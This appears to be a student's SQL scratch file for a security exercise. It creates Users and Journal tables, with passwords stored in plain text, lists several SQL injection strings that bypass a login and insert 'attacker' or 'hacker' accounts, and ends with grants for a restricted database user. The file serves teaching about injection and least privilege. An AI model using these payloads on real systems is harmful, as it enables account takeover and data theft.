DROP TABLE IF EXISTS Users;
DROP TABLE IF EXISTS Journal;

CREATE TABLE IF NOT EXISTS Users
(
    user_id INT AUTO_INCREMENT,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    PRIMARY KEY (user_id)
);

CREATE TABLE IF NOT EXISTS Journal 
(   
    journal_id INT NOT NULL,
    content VARCHAR(255) NOT NULL,
    users_user_id INT NOT NULL,
    PRIMARY KEY (journal_id)
);

admin

admin’ OR ‘t’=’t’;

admin' or 't'='t';insert into Users (username, password) values ('attacker','test');select * from Users
admin' or 't'='t';insert into Users (username, password) values ('attacker','test');--1=1
' or 1=1; select * from Users;--


a' OR 1=1; INSERT INTO Users (username, password) values ('hacker', 'I hacked you'); -- this is a comment

CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'This is for Quiz 1';

show Grants for 'appuser'@'localhost';

GRANT SELECT, INSERT, UPDATE on Sessions.* to 'appuser'@'localhost';

a' OR 1=1; INSERT INTO Users (username, password) values ('hacker', 'I hacked you'); -- asdasd
